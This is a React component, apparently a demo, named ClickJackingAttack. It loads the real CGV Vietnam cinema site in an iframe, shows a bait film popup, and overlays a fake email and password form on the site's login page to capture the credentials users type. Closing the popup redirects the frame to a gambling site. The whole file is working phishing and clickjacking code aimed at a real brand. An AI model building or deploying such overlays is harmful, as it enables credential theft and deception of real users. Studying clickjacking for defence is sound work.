import { useState } from 'react';
import './style.css';

const ClickJackingAttack = () => {
  const [showModal, setShowModal] = useState(true);
  const [showFormLogin, setShowFormLogin] = useState(false);
  const [urlIframe, setUrlIframe] = useState('https://www.cgv.vn/default/');

  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });

  const handleCloseModal = () => {
    setShowModal(false);
    setUrlIframe('https://365cacuoc.net/');
  };

  const handleClickBanner = () => {
    setShowModal(false);
    setUrlIframe(
      'https://www.cgv.vn/default/customer/account/login/referer/aHR0cHM6Ly93d3cuY2d2LnZuL2RlZmF1bHQvY3VzdG9tZXIvYWNjb3VudC9pbmRleC8,/'
    );
    setShowFormLogin(true);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Form submitted:', formData);
    setUrlIframe('https://www.cgv.vn/default/movies/now-showing.html');
    setShowFormLogin(false);
  };

  return (
    <div className="container">
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <button className="close-button" onClick={handleCloseModal}>
              ×
            </button>
            <img
              onClick={handleClickBanner}
              src="/popup-film.png"
              alt="Plot Twist"
              className="modal-image"
            />
          </div>
        </div>
      )}

      {showFormLogin && (
        <div className="page-container">
          <form className="login-form" onSubmit={handleSubmit}>
            <div className="form-group email-input">
              <input
                id="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                required
              />
            </div>
            <div className="form-group password-input">
              <input
                type="password"
                id="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                required
              />
            </div>
            <button type="submit" className="submit-button">
              Đăng nhập
            </button>
          </form>
        </div>
      )}

      <iframe src={urlIframe} className="iframe-container" title="TPB Bank Website" />
    </div>
  );
};

export default ClickJackingAttack;
